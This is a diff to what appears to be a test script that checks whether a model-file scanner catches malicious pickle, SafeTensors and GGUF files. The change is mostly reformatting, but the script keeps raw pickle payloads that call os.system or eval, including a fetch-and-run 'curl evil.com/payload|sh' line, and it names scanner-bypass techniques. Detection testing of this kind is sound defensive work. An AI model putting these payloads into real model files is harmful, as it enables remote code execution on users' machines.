@@ -21,19 +21,17 @@ import json
 import os
 import struct
 import sys
-import tempfile
 import time
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 
-from scanner.cli import main as scanner_main
 from scanner.analyzer.ast_visitor import analyze_python_source
+from scanner.analyzer.gguf_scanner import analyze_gguf_file
 from scanner.analyzer.pickle_scanner import scan_pickle_bytes
 from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
-from scanner.analyzer.gguf_scanner import analyze_gguf_file
-from scanner.analyzer.taint_engine import analyze_taint
 from scanner.analyzer.sandbox_executor import sandbox_execute
 from scanner.analyzer.symbolic_resolver import resolve_strings_in_source
+from scanner.analyzer.taint_engine import analyze_taint
 
 
 class AttackSimulation:
@@ -167,14 +165,14 @@ except Exception:
 # ═══════════════════════════════════════════════════════════════════════
 
 ATTACK_4_PICKLE_CORRUPTED = (
-    b"\x80\x02"               # Protocol 2
-    b"\x8c\x02os"             # SHORT_BINUNICODE "os"
-    b"\x8c\x06system"         # SHORT_BINUNICODE "system"
-    b"\x93"                   # STACK_GLOBAL (os.system)
+    b"\x80\x02"  # Protocol 2
+    b"\x8c\x02os"  # SHORT_BINUNICODE "os"
+    b"\x8c\x06system"  # SHORT_BINUNICODE "system"
+    b"\x93"  # STACK_GLOBAL (os.system)
     b"\x8c\x19curl evil.com/payload|sh"  # argument
-    b"\x85"                   # TUPLE1
-    b"R"                      # REDUCE
-    b"\xff\xff\xff"           # CORRUPTION — no STOP opcode
+    b"\x85"  # TUPLE1
+    b"R"  # REDUCE
+    b"\xff\xff\xff"  # CORRUPTION — no STOP opcode
 )
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -183,9 +181,9 @@ ATTACK_4_PICKLE_CORRUPTED = (
 # ═══════════════════════════════════════════════════════════════════════
 
 ATTACK_5_PICKLE_REDUCE_EX = (
-    b"cbuiltins\neval\n"      # GLOBAL builtins.eval
-    b"(S'__import__(\"subprocess\").check_output(\"id\")'\n"
-    b"tR."                    # TUPLE + REDUCE + STOP
+    b"cbuiltins\neval\n"  # GLOBAL builtins.eval
+    b'(S\'__import__("subprocess").check_output("id")\'\n'
+    b"tR."  # TUPLE + REDUCE + STOP
 )
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -273,6 +271,7 @@ exec(f"{_m}; {_c}({_a})")
 # Technique: Embed C2 URLs in model metadata for downstream eval
 # ═══════════════════════════════════════════════════════════════════════
 
+
 def create_attack_10_safetensors():
     """SafeTensors with C2 URL in metadata."""
     header = {
@@ -290,6 +289,7 @@ def create_attack_10_safetensors():
 # ═══════════════════════════════════════════════════════════════════════
 # INCIDENT 11: GGUF metadata shell injection
 # ═══════════════════════════════════════════════════════════════════════
+
 
 def create_attack_11_gguf():
     """GGUF with shell command in custom metadata."""
@@ -316,13 +316,13 @@ def create_attack_11_gguf():
 
 ATTACK_12_PICKLE_CHAIN = (
     b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00"  # PROTO 4 + FRAME
-    b"\x8c\x08builtins"      # SHORT_BINUNICODE "builtins"
-    b"\x8c\x04eval"          # SHORT_BINUNICODE "eval"
-    b"\x93"                   # STACK_GLOBAL
+    b"\x8c\x08builtins"  # SHORT_BINUNICODE "builtins"
+    b"\x8c\x04eval"  # SHORT_BINUNICODE "eval"
+    b"\x93"  # STACK_GLOBAL
     b"\x8c\x1e__import__('os').system('id')"  # argument
-    b"\x85"                   # TUPLE1
-    b"R"                      # REDUCE
-    b"."                      # STOP
+    b"\x85"  # TUPLE1
+    b"R"  # REDUCE
+    b"."  # STOP
 )
 
 
@@ -380,10 +380,26 @@ def run_simulation():
 
     # Pickle binary attacks
     pickle_attacks = [
-        ("JFrog Bypass: Corrupted pickle (no STOP)", ATTACK_4_PICKLE_CORRUPTED, "Truncated pickle executes before deserialization completes"),
-        ("JFrog Bypass: builtins.eval in pickle", ATTACK_5_PICKLE_REDUCE_EX, "Direct eval() call via GLOBAL opcode"),
-        ("Sonatype Bypass: copyreg gadget chain", ATTACK_6_PICKLE_COPYREG, "getattr(__import__('os'), 'system') chain"),
-        ("Pickle protocol 4 STACK_GLOBAL + eval", ATTACK_12_PICKLE_CHAIN, "Protocol 4 builtins.eval with __import__"),
+        (
+            "JFrog Bypass: Corrupted pickle (no STOP)",
+            ATTACK_4_PICKLE_CORRUPTED,
+            "Truncated pickle executes before deserialization completes",
+        ),
+        (
+            "JFrog Bypass: builtins.eval in pickle",
+            ATTACK_5_PICKLE_REDUCE_EX,
+            "Direct eval() call via GLOBAL opcode",
+        ),
+        (
+            "Sonatype Bypass: copyreg gadget chain",
+            ATTACK_6_PICKLE_COPYREG,
+            "getattr(__import__('os'), 'system') chain",
+        ),
+        (
+            "Pickle protocol 4 STACK_GLOBAL + eval",
+            ATTACK_12_PICKLE_CHAIN,
+            "Protocol 4 builtins.eval with __import__",
+        ),
     ]
 
     for name, payload, technique in pickle_attacks:
@@ -396,8 +412,7 @@ def run_simulation():
 
     # SafeTensors attack
     sim = AttackSimulation(
-        "SafeTensors metadata C2 injection",
-        "", "eval() + ngrok + eth-fastscan URLs in metadata"
+        "SafeTensors metadata C2 injection", "", "eval() + ngrok + eth-fastscan URLs in metadata"
     )
     start = time.time()
     data = create_attack_10_safetensors()
@@ -408,8 +423,7 @@ def run_simulation():
 
     # GGUF attack
     sim = AttackSimulation(
-        "GGUF metadata shell injection",
-        "", "PowerShell encoded command in custom metadata key"
+        "GGUF metadata shell injection", "", "PowerShell encoded command in custom metadata key"
     )
     start = time.time()
     data = create_attack_11_gguf()
@@ -462,8 +476,10 @@ if __name__ == "__main__":
 
     s = report["summary"]
     print("=" * 70)
-    print(f"  RESULT: {s['detected']}/{s['total_attacks']} attacks detected "
-          f"({s['detection_rate_percent']}%)")
+    print(
+        f"  RESULT: {s['detected']}/{s['total_attacks']} attacks detected "
+        f"({s['detection_rate_percent']}%)"
+    )
     print(f"  Total scan time: {s['total_time_ms']}ms")
     print("=" * 70)
 
